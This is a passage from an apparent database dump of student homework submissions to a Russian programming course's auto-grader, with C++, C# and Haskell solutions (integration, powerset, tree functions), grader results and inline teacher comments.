(1265, 34, '533223', '2012-10-01 12:32:40', 1, '#include "stdafx.h"\r\n\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class Func>\r\ndouble integral(Func f, double a, double b)\r\n{\r\n	double res = 0;\r\n	for (int i = 1; i <= 100; i++)\r\n	{\r\n		res += f(a+ (b-a)/100*i)*(b-a)/100;\r\n	}\r\n		return res;\r\n}\r\n\r\n// Примеры функций\r\n\r\ndouble square(double i)\r\n{\r\n	return i*i;\r\n}\r\n\r\ndouble cube(double i)\r\n{\r\n	return i*i*i;\r\n}\r\n\r\nint main()\r\n{\r\n	// Примеры вызовов\r\n\r\n	// Так можно передавать функции\r\n	cout << (integral(square, 0, 1)) << "\r\n";\r\n	cout << (integral(cube, 0, 1)) << "\r\n";\r\n\r\n	// Так можно передавать лямбда выражения\r\n			   \r\n	cout << (integral([] (double i) -> double\r\n			   { \r\n				   return i*i; \r\n			   }, \r\n			   0 , 1)) << "\r\n";\r\n	// Или, в данном случае, -> тип можно не писать\r\n	\r\n	cout << (integral([] (double i) { return i*i; }, 0, 1)) << "\r\n";\r\n	\r\n	auto sqr = [] (double i) { return i*i; };\r\n	cout << (integral(sqr, 0 , 1)) << "\r\n";\r\n\r\n\r\n	int n;\r\n	cin >> n;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1266, 33, '329842', '2012-10-01 13:06:29', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace Integral\r\n{\r\n    class Program\r\n    {\r\n        private const int NUMBER_OF_PARTS = 10000;\r\n\r\n        static double Integral(Func<double, double> f, double a, double b)\r\n        {\r\n            double result = 0;\r\n            double h = (b - a) / NUMBER_OF_PARTS;\r\n            for (int i = 0; i < NUMBER_OF_PARTS; i++)\r\n            {\r\n                double start = a + i * h;\r\n                result += h * f(start + h / 2);\r\n            }\r\n            return result;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Console.WriteLine("Integral1 = " + Integral(i => i*i, 1, 10).ToString("N3"));\r\n            Console.WriteLine("Integral2 = " + Integral(i => i*i*i, 2, 5).ToString("N3"));\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1267, 34, '329842', '2012-10-01 13:10:49', 1, '#include "stdafx.h"\r\n\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int NUMBER_OF_PARTS = 10000;\r\n\r\ntemplate <class Func>\r\ndouble integral(Func f, double a, double b)\r\n{\r\n    double result = 0;\r\n    double h = (b - a) / NUMBER_OF_PARTS;\r\n    for (int i = 0; i < NUMBER_OF_PARTS; i++)\r\n    {\r\n        double start = a + i * h;\r\n        result += h * f(start + h / 2);\r\n    }\r\n    return result;\r\n}\r\n\r\nint main()\r\n{\r\n    cout <<"Integral1 = " << integral([] (double i) { return i*i; }, 1, 10) << "\r\n";\r\n\r\n    auto cube = [] (double i) { return i*i*i; };\r\n    double res2 = integral(cube, 2, 5);\r\n    cout <<"Integral2 = " << res2 << "\r\n";\r\n\r\n    int p;\r\n    cin >> p;\r\n\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1268, 47, 'tonyo', '2012-10-01 14:01:25', 1, '  --- ОК, очень хорошо. Мне лично первый вариант больше нравится, но и второй неплохой.\r\n-- Первый вариант\r\npowerset [] = [[]]\r\npowerset (x:xs) = subs ++ map (x:) subs\r\n    where subs = powerset xs\r\n\r\n-- Второй вариант\r\npowerset1 list = map (trans list) [0 .. 2^n-1]\r\n    where n = length list\r\n\r\ntrans list x = trans1 list x []\r\n\r\ntrans1 ys x res\r\n    | x == 0 = res\r\n    | odd x = trans1 taily (div x 2) (heady:res)\r\n    | otherwise = trans1 taily (div x 2) res\r\n        where heady = head ys\r\n              taily = tail ys\r\n', '<br/>Тесты успешно пройдены!'),
(1269, 34, 'Маргарита Нурмухаметова', '2012-10-01 15:37:12', 1, '// Integral.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std; \r\ntemplate <class Func>\r\ndouble FindIntegral(Func f, int a, int b)\r\n{\r\n	double n = 100; //шаг\r\n	double result = 0.0;\r\n	double sum = 0.0;\r\n	for (int i = 1; i <= n-1; i++){\r\n        sum = sum + f(a + i*((b-a)/n));\r\n	}\r\n	result = ((b-a)/n)*((f(a)+f(b))/2 + sum);\r\n	\r\n	return result;\r\n}\r\n\r\n\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n\r\n	cout << FindIntegral([] (double i) -> double\r\n			   { \r\n				   return i*i*i; \r\n			   }, \r\n			   0, 1) << "\r\n";\r\n    system ("pause");\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1270, 43, 'erwert', '2012-10-01 16:14:03', 0, 'f q a d s r\r\n	| mod a d == 0 = f q (div a d) d (s+1) r\r\n	| a == 1 = (r*d^(s-1)*(d-1))\r\n	| s == 0 = f q a (d+1) 0 r\r\n	| d >= 1 + (div q 2) = (a - 1)\r\n	| True = f q a (d+1) 0 (r*d^(s-1)*(d-1))\r\n\r\nsmod a 0 m r = mod r m\r\nsmod a s m r = smod a (s-1) m (mod (r*a) m)\r\n\r\neuclid a b =  let x = smod a ((f b b 2 0 1) - 1) b 1\r\n		in (x, -(div (a*x + 1) b))\r\n', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1271, 47, '419046', '2012-10-01 16:33:27', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = powerset xs ++ (map (x:) (powerset xs)) ', '<br/>Тесты успешно пройдены!'),
(1272, 47, '419046', '2012-10-01 16:33:27', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = powerset xs ++ (map (x:) (powerset xs)) ', '<br/>Тесты успешно пройдены!'),
(1273, 43, 'erwert', '2012-10-01 16:45:04', 0, 'f q a d s r\r\n	| mod a d == 0 = f q (div a d) d (s+1) r\r\n	| a == 1 = (r*d^(s-1)*(d-1))\r\n	| s == 0 = f q a (d+1) 0 r\r\n	| d >= 1 + (div q 2) = (a - 1)\r\n	| True = f q a (d+1) 0 (r*d^(s-1)*(d-1))\r\n\r\neuclid a b =  let x = mod (a^((f b b 2 0 1) - 1)) b\r\n		in (x, -(div (a*x + 1) b))\r\n', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1274, 39, '533223', '2012-10-01 16:48:18', 0, 'data Tree = Empty| Node Integer Tree Tree deriving Show\r\n\r\nminHeight tree = mH2 1000 0 tree\r\nmH2 min res (Node _ (Node intl ll lr) (Node intr rl rr)) = if min < res \r\n				then 1000\r\n				else if (lmin<min)\r\n					then mH2 lmin (1+res) (Node intr rl rr)\r\n					else mH2 min (1+res) (Node intr rl rr)\r\n				where lmin = mH2 min (1+res) (Node intl ll lr)\r\n\r\nmH2 _ res _ = res', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1275, 43, 'erwert', '2012-10-01 16:50:05', 0, 'f q a d s r\r\n	| q <= 1 = 1\r\n	| mod a d == 0 = f q (div a d) d (s+1) r\r\n	| a == 1 = (r*d^(s-1)*(d-1))\r\n	| s == 0 = f q a (d+1) 0 r\r\n	| d >= 1 + (div q 2) = (a - 1)\r\n	| True = f q a (d+1) 0 (r*d^(s-1)*(d-1))\r\n\r\neuclid a b = eu (min a b) (max a b)  \r\neu a b = \r\n	let x = mod (a^((f b b 2 0 1) - 1)) b\r\n	in (x, -(div (a*x + 1) b))\r\n', 'Выражение имеет неправильное значение: let (x,y) = euclid 1 0 in 1*x+0*y'),
(1276, 43, 'erwert', '2012-10-01 16:54:29', 0, 'f q a d s r\r\n	| q <= 1 = 1\r\n	| mod a d == 0 = f q (div a d) d (s+1) r\r\n	| a == 1 = (r*d^(s-1)*(d-1))\r\n	| s == 0 = f q a (d+1) 0 r\r\n	| d >= 1 + (div q 2) = (a - 1)\r\n	| True = f q a (d+1) 0 (r*d^(s-1)*(d-1))\r\n\r\neuclid a b = (x, -(div (a*x + 1) b))\r\n	where x = mod (a^((f b b 2 0 1) - 1)) b', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1277, 43, 'erwert', '2012-10-01 16:58:06', 1, 'f q a d s r\r\n	| q <= 1 = 1\r\n	| mod a d == 0 = f q (div a d) d (s+1) r\r\n	| a == 1 = (r*d^(s-1)*(d-1))\r\n	| s == 0 = f q a (d+1) 0 r\r\n	| d >= 1 + (div q 2) = (a - 1)\r\n	| True = f q a (d+1) 0 (r*d^(s-1)*(d-1))\r\n\r\neuclid a b = if b == 0 then (1, 1) else (x, -(div (a*x + 1) b))\r\n	where x = mod (a^((f b b 2 0 1) - 1)) b\r\n', '<br/>Тесты успешно пройдены!'),
(1278, 35, '4837959', '2012-10-01 17:02:47', 1, 'isosc a b c = dist a b == dist b c ||\r\n              dist b c == dist c a ||\r\n              dist c a == dist a b\r\n\r\ndist a b = sqrt((fst a - fst b) ^ 2 + (snd a - snd b) ^ 2)\r\n   --- ОК, но нет особого смысла извлекать корень, без этого получится и быстрее и точнее\r\n', '<br/>Тесты успешно пройдены!'),
(1279, 36, '4837959', '2012-10-01 17:05:08', 1, 'cubeTable n = zip [1..n] (map (^3) [1..n])', '<br/>Тесты успешно пройдены!'),
(1280, 39, '533223', '2012-10-01 17:13:49', 0, 'data Tree = Empty| Node Integer Tree Tree deriving Show\r\n\r\nminHeight tree = mH2 1000 0 tree\r\nmH2 min res (Node _ (Node intl ll lr) (Node intr rl rr)) = if res < min \r\n				then if (lmin<min)\r\n					then mH2 lmin (1+res) (Node intr rl rr)\r\n					else mH2 min (1+res) (Node intr rl rr)\r\n				else min\r\n				where lmin = mH2 min (1+res) (Node intl ll lr)\r\n\r\nmH2 _ res _ = res', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1281, 37, '4837959', '2012-10-01 17:14:38', 1, 'minsum xs = let\r\n                pairs = zip xs (tail xs)\r\n                sumlist = map ((x, y) -> x + y) pairs\r\n            in minimum sumlist', '<br/>Тесты успешно пройдены!'),
(1282, 49, '3431532', '2012-10-01 17:18:24', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.IO;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace ConsoleApplication1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            IntTree node1 = new IntTree(5);\r\n\r\n            IntTree node2 = new IntTree(7);\r\n\r\n            IntTree node3 = new IntTree(7);\r\n\r\n            IntTree node4 = new IntTree(1);\r\n\r\n            node1.left = node2;\r\n\r\n            node2.left = node3;\r\n\r\n            node2.right = node4;\r\n\r\n            Console.Write(node1.Any(x => x.value%2==0));\r\n\r\n        }\r\n\r\n    }\r\n\r\n    class IntTree\r\n\r\n    {\r\n\r\n        public IntTree left, right;\r\n\r\n        public int value;\r\n\r\n\r\n\r\n        public IntTree(int val)\r\n\r\n        {\r\n\r\n            this.left = null;\r\n\r\n            this.right = null;\r\n\r\n            this.value = val;\r\n\r\n        }\r\n\r\n        public bool Any(Predicate<IntTree> pred)\r\n\r\n        {\r\n\r\n            bool result = false;\r\n\r\n            if (this.left != null)\r\n\r\n                result = result || this.left.Any(pred);\r\n               --- Или, просто как вариант,\r\n               ---  if (left != null && left.Any(pred)\r\n               ---     return true;\r\n               --- (то же самое, но немного короче записывается) \r\n\r\n            if (this.right != null)\r\n\r\n                result = result || this.right.Any(pred);\r\n\r\n            return pred.Invoke(this) || result;\r\n                --- Или можно pred(this), без Invoke\r\n \r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1283, 39, '533223', '2012-10-01 17:27:09', 0, 'data Tree = Empty| Node Integer Tree Tree deriving Show\r\n\r\nminHeight tree = mH2 1000 0 tree\r\nmH2 min res (Node _ (Node intl ll lr) (Node intr rl rr)) = if res < min \r\n				then if (lmin<min)\r\n					then mH2 lmin (1+res) (Node intr rl rr)\r\n					else mH2 min (1+res) (Node intr rl rr)\r\n				else min\r\n				where lmin = mH2 min (1+res) (Node intl ll lr)\r\n\r\nmH2 min res (Node _ (Node intl ll lr) Empty)= if res < min\r\n						then mH2 min (1+res) (Node intl ll lr)\r\n						else min\r\n\r\nmH2 min res (Node _  Empty (Node intl ll lr))= if res < min\r\n						then mH2 min (1+res) (Node intl ll lr)\r\n						else min\r\n\r\nmH2 _ res _ = res', '<br/>Тесты успешно пройдены!'),
(1284, 38, '4837959', '2012-10-01 17:35:07', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight node = height'' node - 1\r\nheight'' Empty = 0\r\nheight'' (Node x l r) = 1 + max (height'' l) (height'' r)\r\n', '<br/>Тесты успешно пройдены!'),
(1285, 40, '4837959', '2012-10-01 18:01:46', 1, 'frame n = frame'' [1..n]\r\nframe'' xs = \r\n    let\r\n        n = length xs\r\n    in map (x -> expand x n) xs\r\nexpand cur n\r\n    | cur == 1 || cur == n = take n [1, 1..]\r\n    | otherwise = [1] ++ (take (n - 2) [0, 0..]) ++ [1]\r\n', '<br/>Тесты успешно пройдены!'),
(1286, 34, '442421', '2012-10-01 18:13:31', 1, 'template <class Func>\r\ndouble integral(Func f, double a, double b)\r\n{\r\n	double res = 0 ;\r\n	double h = 0.001;\r\n	int n = (int) (b-a) / h;\r\n	for ( int i = 0 ; i < n ; ++i)\r\n	{\r\n		res += h*f(a+i*h);\r\n	}\r\n	return res;\r\n}\r\ndouble f(double x)\r\n{\r\n	return sin(x);\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	std::cout<<integral(f,0,1)<<"\r\n";\r\n	std::cout<<integral([] (double i) -> double\r\n			   { \r\n				   return i*i; \r\n			   },0,1)<<"\r\n";\r\n	_getch();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1287, 41, '4837959', '2012-10-01 18:21:18', 1, 'countOdd xs = foldr (x res -> if mod x 2 == 1\r\n                               then res + 1\r\n                               else res) 0 xs\r\ncountOdd1 xs = (length.filter (x -> mod x 2 == 1)) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1288, 33, '532002', '2012-10-01 18:22:13', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace Integral\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n       \r\n\r\n\r\n\r\n        static double integral(Func<double, double> f, double a,double b)\r\n\r\n        {\r\n\r\n            double res = 0;\r\n\r\n            double h = (b - a) / 100;\r\n\r\n            double cur = a;\r\n\r\n            for (int i = 0; i < 100; i++) {\r\n\r\n              \r\n\r\n                res += (f(cur) + f(cur + h)) * h/ 2 ;\r\n\r\n                cur += h;\r\n\r\n            }\r\n\r\n            return res;\r\n\r\n\r\n\r\n            \r\n\r\n        }\r\n\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n\r\n\r\n        static double cube(double i)\r\n\r\n        {\r\n\r\n            return i * i * i;\r\n\r\n        }\r\n\r\n        static double line(double i) {\r\n\r\n            return i;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine(integral(line, 0, 1));\r\n\r\n            Console.WriteLine(integral(cube,-1,1));\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1289, 34, '532002', '2012-10-01 18:22:30', 1, '#include "stdafx.h"\r\n\r\n\r\n\r\n#include <iostream>\r\n\r\n#include <conio.h>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\ntemplate <class Func>\r\n\r\ndouble integral(Func f, double a, double b)\r\n\r\n{\r\n\r\n\r\n\r\n	double res = 0;\r\n\r\n    double h = (b - a) / 100;\r\n\r\n    double cur = a;\r\n\r\n    for (int i = 0; i < 100; i++) {       \r\n\r\n        res += (f(cur) + f(cur + h)) * h/ 2 ;\r\n\r\n        cur += h;\r\n\r\n    }\r\n\r\n    return res;\r\n\r\n\r\n\r\n	}\r\n\r\n\r\n\r\ndouble line(double i)\r\n\r\n{\r\n\r\n	return i;\r\n\r\n}\r\n\r\n\r\n\r\ndouble cube(double i)\r\n\r\n{\r\n\r\n	return i*i*i;\r\n\r\n}\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n\r\n\r\n	cout<<integral(line,0,1) << "\r\n";\r\n\r\n	cout<<integral(cube,-1,1) << "\r\n";\r\n\r\n	\r\n\r\n	getch();\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1290, 33, '442421', '2012-10-01 18:22:48', 2, 'static double integral(Func<double,double> f, double a, double b)\r\n        {\r\n            double res = 0;\r\n            double h = 0.001;\r\n   --- Нет, так все-таки нельзя.. Вы же понятия не имеете, какие у вас будут a и b.\r\n   --- Может они например a = 0 и b = 0.0001  - тогда ваше решение выдаст совсем неправильный результат.\r\n   --- Те тут надо все-таки делить отрезок, например, на 100 частей. Это даст хоть какую-то разумную точность.\r\n   --- Это понятно очень просто, но исправьте, пожалуйста.\r\n   --- (Срок задачи вроде бы кончился, но вы все равно сможете ее послать, нажав на главной странице\r\n   --- "Загрузить решение"  \r\n            int n = (int) ((b - a) / h);\r\n            for (int i = 0; i < n; ++i)\r\n            {\r\n                res += h * f(a + i * h);\r\n            }\r\n            return res;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {            \r\n            Console.WriteLine(integral(x => x*x, 0, 1));\r\n            \r\n        }', '<br/>Тесты успешно пройдены!'),
(1291, 42, '4837959', '2012-10-01 18:31:35', 1, 'myfoldl f e [] = e\r\nmyfoldl f e (x:xs) = myfoldl f (f e x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1292, 33, '5772638', '2012-10-01 18:37:31', 1, 'static double integral(Func<double, double> f, double a, double b)\r\n        {\r\n            double res = 0, h = (b - a) / 100, x0 = a;\r\n            while(x0<=b)\r\n            {\r\n                res+= f(x0 - h / 2);\r\n                x0 += h;\r\n            }\r\n            res *= h;\r\n            return res;\r\n           \r\n       \r\n        }\r\n\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n        static  double cube (double i)\r\n        {\r\n            return i * i * i;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Console.WriteLine("int x^2 from 0 to 2 = " + integral(sqr, 0, 2)); // отв = 2,5874\r\n            Console.WriteLine( "int x^3 from -1 to 1 = "+integral(cube, -1, 1)); // отв = 0,04001\r\n            Console.WriteLine("int x^3+2 from 10 to 100 = "+ integral(i => i*i*i+2, 10,100)); // отв = 24109556,9175\r\n            Console.WriteLine("Press any key for exit");\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!'),
(1293, 47, 'erwert', '2012-10-01 18:47:19', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = powerset xs  ++ map(x:) (powerset xs)\r\n', '<br/>Тесты успешно пройдены!'),
(1294, 37, '419046', '2012-10-01 19:06:22', 1, 'minsum (x1:xs) = minimum (zipWith (+) (x1:xs) xs)', '<br/>Тесты успешно пройдены!'),
(1295, 43, '533223', '2012-10-01 19:23:54', 0, 'euclid a b = if (a<b)\r\n		then res(dioph1 (divList a b []) (0,0))\r\n		else dioph1 (divList a b []) (0,0)\r\n\r\ndivList _ 1 xs = xs\r\ndivList a b xs = if (a>b) \r\n			then divList b (rem a b) ((div a b):xs)\r\n			else divList b a xs\r\n\r\ndioph1 [] (a,b) = (a,b)\r\ndioph1 (x:xs) (a,b) = if(a==0||b==0)\r\n			then dioph1 xs (1,-x) \r\n			else dioph1 xs (b, -b*x+a)\r\n\r\nres (a,b) = (b,a)', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1296, 43, '533223', '2012-10-01 19:31:49', 0, 'euclid a b = if (a<b)\r\n		then res(dioph1 (divList a b []) (0,0))\r\n		else dioph1 (divList a b []) (0,0)\r\n\r\ndivList _ 0 xs = [1,1]\r\ndivList _ 1 xs = xs\r\ndivList a b xs = if (a>b) \r\n			then divList b (rem a b) ((div a b):xs)\r\n			else divList b a xs\r\n\r\ndioph1 [] (a,b) = (a,b)\r\ndioph1 (x:xs) (a,b) = if(a==0||b==0)\r\n			then dioph1 xs (1,-x) \r\n			else dioph1 xs (b, -b*x+a)\r\n\r\nres (a,b) = (b,a)', 'Выражение имеет неправильное значение: let (x,y) = euclid 1 0 in 1*x+0*y'),
(1297, 43, '533223', '2012-10-01 19:32:37', 0, 'euclid a b = if (a<b)\r\n		then res(dioph1 (divList a b []) (0,0))\r\n		else dioph1 (divList a b []) (0,0)\r\n\r\ndivList _ 1 xs = xs\r\ndivList a b xs = if (a>b) \r\n			then divList b (rem a b) ((div a b):xs)\r\n			else divList b a xs\r\n\r\ndioph1 [] (a,b) = (a,b)\r\ndioph1 (x:xs) (a,b) = if(a==0||b==0)\r\n			then dioph1 xs (1,-x) \r\n			else dioph1 xs (b, -b*x+a)\r\n\r\nres (a,b) = (b,a)', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1298, 49, '12206137', '2012-10-01 19:48:14', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace Haskell_DZ10 {\r\n    class Tree<T> {\r\n        private Tree<T> left, right;\r\n        private T val;\r\n        public Tree(T val, Tree<T> left, Tree<T> right) {\r\n            this.val = val;\r\n            this.left = left;\r\n            this.right = right;\r\n        }\r\n        public bool Any(Predicate<T> pred) {\r\n            if (pred(val)) {\r\n                return true;\r\n            }\r\n            if (left != null && left.Any(pred)) return true;\r\n            return (right != null && right.Any(pred));\r\n        }\r\n    }\r\n    class Program {\r\n        static void Main(string[] args) {\r\n            var treeYes = new Tree<int>(1, new Tree<int>(2, null, null), new Tree<int>(3, null, null));\r\n            Console.WriteLine(treeYes.Any(x => x % 2 == 0));\r\n            var treeNo = new Tree<int>(1, new Tree<int>(5, null, null), new Tree<int>(3, null, null));\r\n            Console.WriteLine(treeNo.Any(x => x % 2 == 0));\r\n        }\r\n ', '<br/>Тесты успешно пройдены!'),
(1299, 50, '12206137', '2012-10-01 19:48:28', 1, '// DZ_10_2.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class T>\r\nclass Tree {\r\n	Tree<T> *left, *right;\r\n	T val;\r\npublic:\r\n	Tree(T val, Tree<T> *left, Tree<T> *right) {\r\n		this->val = val;\r\n		this->left = left;\r\n		this->right = right;\r\n             --- Просто как замечание, это все намного лучше, видимо, задавать в списке инициализации. \r\n	}\r\n	template <class Func>\r\n	bool Any(Func pred) {\r\n		if (pred(val)) return true;\r\n		if (left && left->Any(pred)) return true;\r\n		return (right && right->Any(pred));\r\n	}\r\n};\r\n\r\nbool isEven(int i) { return i%2 == 0; }\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	Tree<int> treeYes = Tree<int>(1, new Tree<int>(2, NULL, NULL), new Tree<int>(3, NULL, NULL));\r\n              --- Теперь более современно писать не NULL, а nullptr )\r\n	cout << treeYes.Any(isEven) << endl;\r\n	cout << treeYes.Any([](int x) {return x%2 == 0;}) << endl;\r\n\r\n	Tree<int> treeNo = Tree<int>(1, new Tree<int>(5, NULL, NULL), new Tree<int>(3, NULL, NULL));\r\n	cout << treeNo.Any(isEven) << endl;\r\n	cout << treeNo.Any([](int x) {return x%2 == 0;}) << endl;\r\n\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1300, 41, '419046', '2012-10-01 20:07:28', 2, 'countOdd xs = foldr (+) 0 (map (x-> mod x 2) xs)\r\n   --- Нет, countOdd у вас не по условию. Тут надо использовать _только_ foldr, те map использовать нельзя.\r\n   --- Исправьте пожалуйста (у нас на занятии был похожий пример с суммой положительных чисел).\r\n\r\ncountOdd1 xs = length (filter (/=0) (map (x-> mod x 2) xs))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1301, 47, 'Deutsche', '2012-10-01 20:10:06', 1, 'powerset [] = [[]]\r\npowerset s = powers [[]] s\r\n\r\npowers s1 [] = s1\r\npowers s1 (x:s2) = powers ((map(y -> concat [y, [x]]) s1) ++ s1) s2\r\n', '<br/>Тесты успешно пройдены!'),
(1302, 39, '533223', '2012-10-01 20:13:15', 2, '   --- что-то вы не то решение выложили!!! \r\n   --- Выложите пожалуйста сюда  \r\n   --- снова решение для maxHeight, тогда смогу его проверить \r\neuclid a b = if (a<b)\r\n		then res(euclid b a)\r\n		else \r\n			if(b/=0) then dioph1 (divList a b []) (0,0)\r\n			else \r\n				if(a==1) then (1,0)\r\n				else (0,0)\r\ndivList _ 1 xs = xs\r\ndivList a b xs = if (a>b) \r\n			then divList b (rem a b) ((div a b):xs)\r\n			else divList b a xs\r\n\r\ndioph1 [] (a,b) = (a,b)\r\ndioph1 (x:xs) (a,b) = if(a==0||b==0)\r\n			then dioph1 xs (1,-x) \r\n			else dioph1 xs (b, -b*x+a)\r\n\r\nres (a,b) = (b,a)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1303, 43, '533223', '2012-10-01 20:13:32', 1, 'euclid a b = if (a<b)\r\n		then res(euclid b a)\r\n		else \r\n			if(b/=0) then dioph1 (divList a b []) (0,0)\r\n			else \r\n				if(a==1) then (1,0)\r\n				else (0,0)\r\ndivList _ 1 xs = xs\r\ndivList a b xs = if (a>b) \r\n			then divList b (rem a b) ((div a b):xs)\r\n			else divList b a xs\r\n\r\ndioph1 [] (a,b) = (a,b)\r\ndioph1 (x:xs) (a,b) = if(a==0||b==0)\r\n			then dioph1 xs (1,-x) \r\n			else dioph1 xs (b, -b*x+a)\r\n\r\nres (a,b) = (b,a)', '<br/>Тесты успешно пройдены!'),
(1304, 39, '4837959', '2012-10-01 22:00:16', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nmaxHeight = 1000000\r\n\r\nminHeight node = minHeight'' maxHeight 0 node\r\nminHeight'' curMin _ Empty = curMin\r\nminHeight'' _ curHeight (Node x Empty Empty) = curHeight\r\nminHeight'' curMin curHeight (Node x l r) \r\n    | curHeight == curMin - 1 = curMin\r\n    | otherwise = let\r\n                    leftmin = minHeight'' curMin (curHeight + 1) l\r\n                    rightmin = minHeight'' leftmin (curHeight + 1) r\r\n                  in rightmin\r\n', '<br/>Тесты успешно пройдены!'),
(1305, 41, '51559263', '2012-10-01 22:38:04', 1, 'countOdd xs = foldr (  x y -> if mod x 2 == 0  \r\n\r\n                               then y else y + 1  ) 0 xs\r\n\r\n\r\n\r\ncountOdd1 xs = length ( filter (x -> mod x 2 /= 0) xs )\r\n', '<br/>Тесты успешно пройдены!'),
(1306, 49, '2562137', '2012-10-01 23:18:42', 1, 'using System;\r\n\r\nnamespace AnyTree\r\n{\r\n    class Tree\r\n    {\r\n        int v;\r\n        Tree l, r;\r\n\r\n        public Tree(int v, Tree l, Tree r) {\r\n        	this.v = v;\r\n        	this.l = l;\r\n        	this.r = r;\r\n        }\r\n        \r\n        public bool any(Predicate<int> fun) {\r\n        	return fun(v) || l != null && l.any(fun) || r != null && r.any(fun);\r\n        }\r\n    }\r\n\r\n    class MainClass\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n        	Tree t1 = new Tree(1, new Tree(2, null, null), new Tree(3, null, null));\r\n        	Tree t2 = new Tree(1, new Tree(5, null, null), new Tree(3, null, null));\r\n\r\n        	Predicate<int> isEven = x => x % 2 == 0;\r\n\r\n        	Console.WriteLine(t1.any(isEven));\r\n        	Console.WriteLine(t2.any(isEven));\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1307, 50, '2562137', '2012-10-01 23:36:28', 1, '#include <iostream>\r\nusing namespace std;\r\n\r\nclass Tree {\r\n	public:\r\n		int v;\r\n		Tree *l, *r;\r\n\r\n		Tree(int val, Tree *left, Tree *right) : v(val), l(left), r(right) {}\r\n\r\n		~Tree() {\r\n			if (l) delete l;\r\n			if (r) delete r;\r\n       --- Кстати можно просто\r\n       ---	delete l;\r\n       ---	delete r;\r\n       --- (если указатель нулевой, то delete просто ничего не делает, так в стандарте написано..\r\n		}\r\n};\r\n\r\ntemplate <class Predicate>\r\nbool any(Predicate f, Tree *t)\r\n{\r\n	return f(t -> v) || t -> l && any(f, t -> l) || t -> r && any(f, t -> r);\r\n}\r\n\r\nint main()\r\n{\r\n	auto isEven = [] (int x) { return x % 2 == 0; };\r\n	\r\n	Tree *t1 = new Tree(1, new Tree(2, NULL, NULL), new Tree(3, NULL, NULL));\r\n	Tree *t2 = new Tree(1, new Tree(5, NULL, NULL), new Tree(3, NULL, NULL));\r\n             --- Теперь вместо NULL более современно nullptr :)\r\n\r\n	cout << any(isEven, t1) << "\r\n";\r\n	cout << any(isEven, t2) << "\r\n";\r\n\r\n	delete t1;\r\n	delete 